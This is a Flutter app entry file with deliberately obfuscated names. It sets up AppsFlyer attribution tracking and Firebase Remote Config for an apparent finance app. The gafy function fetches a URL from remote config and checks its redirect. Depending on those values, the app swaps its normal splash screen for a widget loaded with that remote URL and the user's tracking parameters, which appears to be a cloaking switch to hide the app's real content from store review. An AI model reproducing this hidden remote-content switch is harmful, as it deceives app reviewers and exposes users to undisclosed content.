import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:finance_app5/model/aa.dart';
import 'package:finance_app5/pages/firebase_options.dart';
import 'package:finance_app5/pages/splash_page.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';

late AppsflyerSdk _appsflyerSdk;

bool gdfgdf = false;
String hthfgjfg = '';
String fsdxex = '';
Map mkfsdmfkdsfs = {};
Map fmksdfmsdkmfs = {};
bool ghfdhfghfg = false;
String ddasdasfs = '';
String gsdgdfgdf = '';
String rteter = '';
String fsdfdsfsdf = '';

int? initScreen;
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await N().activate();
  await fsdfsd();
  await gfsdggfsdf();
  SharedPreferences preferences = await SharedPreferences.getInstance();
  initScreen = preferences.getInt('initScreen');
  await preferences.setInt('initScreen', 1);
  runApp(const MyApp());
}

Future<void> gfsdggfsdf() async {
  final TrackingStatus dasfa =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(dasfa);
}

Future<void> fsdfsd() async {
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'doJsrj8CyhTUWPZyAYTByE',
    appId: '6503698850',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  _appsflyerSdk.onAppOpenAttribution((res) {
    mkfsdmfkdsfs = res;
    fsdxex = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });

  _appsflyerSdk.onInstallConversionData((res) {
    fmksdfmsdkmfs = res;
    ghfdhfghfg = res['payload']['is_first_launch'];
    ddasdasfs = res['payload']['af_status'];
    hthfgjfg = '&is_first_launch=$ghfdhfghfg&af_status=$ddasdasfs';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());
    mkfsdmfkdsfs = dp.toJson();
  });

  _appsflyerSdk.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
  await fsdgdfsg();
}

Future<void> fsdgdfsg() async {
  try {
    rteter = await _appsflyerSdk.getAppsFlyerUID() ?? '';
    rteter = '&appsflyer_id=$rteter';
    print("AppsFlyer ID: $rteter");
  } catch (e) {
    print("Failed to get AppsFlyer ID: $e");
  }
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(
            seedColor: Colors.deepPurple, background: const Color(0xFF151515)),
        useMaterial3: true,
      ),
      home: FutureBuilder<bool>(
        future: gafy(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.black,
              child: Center(
                child: Container(
                  height: 70,
                  width: 70,
                  child: ClipRRect(
                    borderRadius: BorderRadius.circular(15),
                    child: Image.asset('assets/icon.png'),
                  ),
                ),
              ),
            );
          } else {
            if (snapshot.data == true && nghf != '') {
              return gdfgdfgd(
                fdsxsa: nghf,
                swqeqw: hthfgjfg,
                gdfgfdgd: rteter,
              );
            } else {
              return SplashPage();
            }
          }
        },
      ),
    );
  }
}

String nghf = '';

Future<bool> gafy() async {
  final fsdfs = FirebaseRemoteConfig.instance;
  await fsdfs.fetchAndActivate();
  await fsdfsd();
  await fsdgdfsg();
  String dsdfdsfgdg = fsdfs.getString('gazfy');
  String cdsfgsdx = fsdfs.getString('gafy');
  if (!dsdfdsfgdg.contains('nonegafy')) {
    final zas = HttpClient();
    final bdf = Uri.parse(dsdfdsfgdg);
    final hfgjghj = await zas.getUrl(bdf);
    hfgjghj.followRedirects = false;
    final response = await hfgjghj.close();
    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
      nghf = dsdfdsfgdg;
      return true;
    }
  }
  return dsdfdsfgdg.contains('nonegafy') ? false : true;
}
